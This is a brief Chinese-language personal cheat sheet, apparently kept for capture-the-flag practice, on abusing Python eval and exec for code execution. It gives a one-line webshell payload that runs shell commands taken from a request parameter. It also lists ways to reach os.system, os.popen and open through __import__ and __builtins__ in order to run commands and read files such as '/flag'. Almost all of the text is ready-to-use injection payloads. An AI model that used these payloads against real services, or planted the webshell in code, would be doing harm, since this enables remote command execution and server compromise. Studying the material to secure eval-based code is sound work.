====== eval恶意代码执行 ======
Created 星期日 24 十一月 2024

https://docs.python.org/3.8/

webshell:
''__import__('os').system(requests.values.get('shell'))''

eval使用逗号分隔多行指令（当作列表处理），赋值使用列表内的海象符`'':=''`：
eval('expr1, expr2') -> list
eval('[a:=1, b:=2]')

exec支持执行多行指令，用分号隔开:
exec('expr1; expr2')

使用 ''__import__(库名)'' 动态加载库
''eval('__import__('os').listdir()')''

os.listdir() -> list
os.system(cmd) -> None
os.popen(cmd).read() -> str
open('file', 'r').read() -> str

dir(package)  查看库里的所有方法

''__builtins__ -> dict''
''__builtins__''包含的常用函数：eval、exec、''__import__''

''__builtins__['eval']('cmd')''
''__builtins__.__import__('os').system('ls') 无返回值''
''__builtins__.__import__('os').popen('ls').read() 返回字符串''
''__builtins__.__getitem__('open')('/flag').read() 返回字符串''
